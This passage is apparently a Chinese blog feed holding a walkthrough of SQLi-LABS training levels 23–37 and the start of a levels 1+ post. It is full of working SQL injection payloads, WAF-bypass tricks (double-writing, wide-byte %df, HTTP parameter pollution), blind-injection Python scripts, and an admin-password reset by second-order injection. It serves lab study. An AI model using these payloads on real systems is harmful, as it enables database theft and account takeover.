      <content type="html"><![CDATA[<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>从这里开始应该是有做了防护，我们可以边看源代码练习代码审计，一边学习各种过waf的技巧了<a id="more"></a><br>这一题查看源代码的话发现注释符被过滤掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure><p>但其实对于这一句SQL语句，我们可以直接单引号闭合而不用注释去把后面的东西给省略掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-23/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>直接报出数据库，此题完结</p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>这一题应该是设计二次注入的题目<br>在CTF题目里面的话肯定是要你获取admin的账号然后改变admin的密码用admin账号登录获取flag<br>这里主要关键是pass_change.php这里面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span></span><br></pre></td></tr></table></figure><p>若我们在修改密码的时候<br>注册一个<code>admin’#</code>的用户就是为了后期能够使这一句话后面的内容全都注释的，从而直接更新的是<code>admin</code>的用户名<br>这时候的语句就会变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">'$pass'</span> where username=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure><p>改你想要密码，然后退出在直接用admin登录就好</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>这一题看源代码会发现有一个黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把or还有AND都会替换成为<code>&quot;&quot;</code>，这里是大小写都会被拦截下来的<br>这时候其实可以有几个办法能够绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）大小写变形Or,OR,oR</span><br><span class="line">（2）编码，hex，urlencode</span><br><span class="line">（3）添加注释/*or*/</span><br><span class="line">（4）利用符号and=&amp;&amp; or=||</span><br><span class="line">（5）双写绕过</span><br></pre></td></tr></table></figure><p>输入一个单引号会出现单引号的报错，所以我们尝试闭合一下<br><code>http://127.0.0.1/sqlilabs/Less-25/?id=1%27 %23</code> 成功出现回显 </p><p>我这里选择用双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; aandnd updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><p>符号绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; || updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>跟上面一题同样的过滤方式，语句变简单了，不用单引号去闭合<br>但是这一题不能再用报错注入，因为源码中把报错信息给注释掉了，可以用盲注，我们需要用的是union注入或者是盲注<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>再来一个二分法盲注，通过注入成功还会显示登录名这个标志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-25a/?id=1 aandnd ascii(substr(database(),&#123;_&#125;,1))&gt;&#123;__&#125;%23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p>注意 上面这两关在写到关于information这个单词的时候，需要注意它里面存在or，我们需要双写绕过</p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>输入?id=’会出现单引号的报错<br>但是想用注释符去闭合发现没效果，再用<code>?id=1&#39; or &#39;1&#39;=&#39;1</code>去尝试发现回显成功，这有可能就是注释符被过滤了<br>看看源代码，果然黑名单被过滤了，空格也被过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out spaces</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没关系，这样我们也可以使用报错注入，这里空格要想绕过的话不能够用注释了，我们可以用<code>%a0</code>，但是我们也可以用无空格报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-26/?id=1&apos; ||updatexml(1,concat(0x7e,database(),0x7e),1)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>用%a0也可以注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-26/?id=1&apos;%a0anandd%a0updatexml(1,concat(0x7e,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.TABLES</span><br><span class="line">%a0where%a0TABLE_SCHEMA=database()),0x7e),1)%a0anandd%0a&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>此处我们需要说明两方面：对于<code>注释</code>和结尾字符的我们此处只能利用<br>构造一个<code>’</code> 来闭合后面到<code>’</code> ；<br>对于空格，有较多的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure></p><p>注意上面的编码绕不过的话我们可以用Linux环境测试</p><p>Less-26a<br>只是查询的句子变了，多了一个括号，这一题也不能报错<br>我们可以用盲注<br><a href="http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr" target="_blank" rel="noopener">http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr</a>(‘1’=’1</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>这里发现源代码里面的黑名单又壮大了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们任然可以用双写绕过，也可以用大小写绕过，但是我们直接报错注入就行了不用麻烦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-27/?id=1&apos;and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>这一题就是源代码把报错注入的回显给注释掉<br>那我们用盲注就好<br>双引号闭合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-27a/?id=1"and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;"&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>这一题把<code>union select</code>无论大小写都过滤掉了，把上面那几题能够双写绕过的全都封杀掉了<br>这一题只能够盲注，不能报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-28/?id=1')and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;('&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>这一题跟上面一题区别不大，也是用盲注，也可以用<code>union注入</code>，只是不要出现+号就好<br>忙著自己闭合单引号和括号就行<br>这里我用的是union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-28a/?id=-1%27)unIon(SeLect%201,database(),%273</span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>这一题好像是涉及到二层服务的问题，里面的有一个叫HPP(http参数污染)攻击<br>但是没关系就是第一个参数通过了第一层服务器的waf过滤结果第二个参数没有过滤，这是因为apache的特性，只获取最后一个参数<br>这里我们是可以直接用单引号闭合就ok</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-29/?id=1&amp;id=-1%27%20union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>同上面的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br></pre></td></tr></table></figure><p>就是先利用了这个Tomcat去做waf过滤，其实对第二个参数不起作用<br>这次直接闭合双引号就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-30/?id=1&amp;id=-1&quot; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>Less-31<br>这一题就是SQL查询语句变了一下，我们需要闭合双引号和括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-31/?id=1&amp;id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>这一题我一开始没有头绪，因为所有参数都被转义了，不能够闭合，后来发现是另外的绕过方法，原来是宽字节的问题<br>原理：mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如<code>%aa%5c</code> 就是一个汉字（前一个ascii 码大于128 才能到汉字的范围）。我们在过滤<code>’</code> 的时候，往往利用的思路是将<code>‘</code> 转换为<code>\’</code><br>因此我们在此想办法将‘ 前面添加的\ 除掉，一般有两种思路：</p><ol><li><code>%df</code> 吃掉<code>\</code> 具体的原因是urlencode(\‘) = <code>%5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形成<code>%df%5c%27</code>，而上面提到的mysql 在GBK 编码方式的时候会将两个字节当做一个汉字，此事<code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</li><li>将<code>\’</code> 中的<code>\</code> 过滤掉，例如可以构造<code>%**%5c%5c%27</code> 的情况，后面的%5c 会被前面的<code>%5c</code>给注释掉。这也是bypass 的一种方法。</li></ol><p>看源代码我们利用单引号闭合然后加上%df就好，这里我们可以用union注入也可以用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-32/?id=-1%df%27union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>这个同上面那题一模一样直接闭合单引号就好，是就是上面写的check函数应该是作者自己写的，这一题是直接调用了系统的函数<br>对比一下两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-33/?id=-1%df%27 union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><p>这里面怎么防范呢？<br>使用addslashes(),我们需要将mysql_query 设置为<code>binary</code> 的方式，才能防御此漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</span><br></pre></td></tr></table></figure><p>这时候我想到了我当时做的一个题目好像utf8_general_ci可以用编码去绕过，但是那个是在mysql服务端起作用的</p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>这一题换了post的模式但是利用方法还是有点不同的，<br>本关是post 型的注入漏洞，同样的也是将post 过来的内容进行了‘ \ 的处理。由上面的例子可以看到我们的方法就是将过滤函数添加的\ 给吃掉。而get 型的方式我们是以url 形式提交的，因此数据会通过URLencode，如何将方法用在post 型的注入当中，我们此处介绍一个新的方法。将utf-8 转换为utf-16 或utf-32，例如将<code>‘</code> 转为utf-16 为<code>♦&#39;</code>  。我们就<br>可以利用这个方式进行尝试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=♦&apos; or 1=1#&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>但也可以直接用%df绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=ade3&amp;submit=Submit</span><br></pre></td></tr></table></figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>这一题水，根本没有使用任何引号不需要闭合，它的转义也是多余的，直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-35/?id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p>这一关里面用了<code>mysql_real_escape_string</code>函数去进行过滤<br>是因mysql 我们并没有设置成gbk，所以<code>mysql_real_escape_string()</code>依旧能够被突破。方法<br>和上述是一样的。<br>用utf-16绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%ef%bf%bd%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>用%df去绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%df%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>有报错输出选择报错注入，就是post方式的宽字节<br>uname=admin%df’ and updatexml(1,concat(0x7e,database(),0x7e),1)# &amp;passwd=admin&amp;submit=Submit</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>SQLi-LABS(Adv)这一部分的题目完结，这一部分主要是对输入的数据进行了过滤和防护，但是都过滤得不全，<br>还是会存在多种绕过的方法，这一部分学到了新的知识，就是用utf-16编码绕过宽字节的那一部分内容，其实这里的宽字节前提条件是需要客户端里面设置了gbk，服务端跟过程没有设置同样的编码导致的，所以开发的时候得注意，另外的话这里边的二次注入的题目也是很值得推敲的，也学到了新知识，就是服务器两层架构以及http参数污染的应用，有点意思。</p>]]></content>
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs实战记录(一)</title>
      <link href="/2018/08/29/sqli-labs-training-1/"/>
      <url>/2018/08/29/sqli-labs-training-1/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近啊先自己SQL注入确实不行，我只能拿出sql注入的基础部分来练练收了，这个实验环境是sqlilabs<a id="more"></a></p><p>一些前置知识<br>系统函数<br>介绍几个常用函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure><p>字符串连接函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure><p>一般用于尝试的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ps:--+可以用#替换，url 提交过程中Url 编码后的#为%23</span><br><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 